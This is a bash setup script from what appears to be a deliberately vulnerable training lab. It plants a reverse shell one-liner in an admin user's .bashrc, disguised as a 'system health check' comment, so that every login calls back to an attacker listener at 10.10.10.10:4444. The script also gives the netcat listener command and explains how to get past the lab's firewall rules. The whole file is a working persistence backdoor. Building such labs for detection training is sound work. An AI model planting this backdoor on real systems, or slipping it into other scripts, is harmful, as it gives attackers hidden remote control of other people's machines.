#!/bin/bash
# =============================================================================
# ACME IT Corp - Reverse Shell Backdoor in mallorymartinez's .bashrc
# =============================================================================
# Appends a bash reverse shell one-liner to mallorymartinez's .bashrc,
# disguised as a "system health check" comment. The shell fires every time
# Mallory opens a new interactive session (login or su).
#
# Run independently:  sudo ./vulnerabilities/backdoor_bashrc.sh
# Called by:          setup.sh
#
# Requires: users/create_users.sh must have run first
#
# Target:    mallorymartinez (sudo/admin user)
# Callback:  10.10.10.10:4444  (attacker listener IP — change as needed)
#
# ⚠️  CONFLICT: defenses/iptables.sh + defenses/ufw.sh
#     Outbound connections are not explicitly allowed on port 4444.
#     To receive the shell, add a temporary allow rule or adjust CALLBACK_IP/PORT
#     to match a reachable listener on a permitted port.
#
# ⚠️  CONFLICT: defenses/snort.sh (sid:1000012)
#     Fires on /bin/sh in outbound TCP traffic. This backdoor will generate
#     an alert when triggered — intentional for the detection exercise.
#
# Trigger:
#   su - mallorymartinez
#   (or SSH as mallorymartinez)
#
# Listener (on attacker):
#   nc -lvnp 4444
# =============================================================================

set -euo pipefail

# Attacker callback — adjust to match your lab attacker IP
CALLBACK_IP="10.10.10.10"
CALLBACK_PORT="4444"

BASHRC="/home/mallorymartinez/.bashrc"

echo "[backdoor] Injecting reverse shell into mallorymartinez's .bashrc..."

# -----------------------------------------------------------------------------
# Remove any existing backdoor line to keep this idempotent
# -----------------------------------------------------------------------------
sed -i '/bash -i >& \/dev\/tcp/d' "$BASHRC"
sed -i '/System health check - do not remove/d' "$BASHRC"

# -----------------------------------------------------------------------------
# Append backdoor disguised as a system health check comment
# -----------------------------------------------------------------------------
cat >> "$BASHRC" << EOF

# System health check - do not remove
bash -i >& /dev/tcp/${CALLBACK_IP}/${CALLBACK_PORT} 0>&1 &
EOF

chown mallorymartinez:mallorymartinez "$BASHRC"
chmod 644 "$BASHRC"

echo "[backdoor] Backdoor injected into $BASHRC"
echo "[backdoor] Callback: ${CALLBACK_IP}:${CALLBACK_PORT}"
echo "[backdoor] To change the callback IP/PORT, edit CALLBACK_IP/CALLBACK_PORT at the top of this script."
echo "[backdoor] Trigger: su - mallorymartinez  (or SSH as mallorymartinez)"
echo "[backdoor] Listener: nc -lvnp ${CALLBACK_PORT}"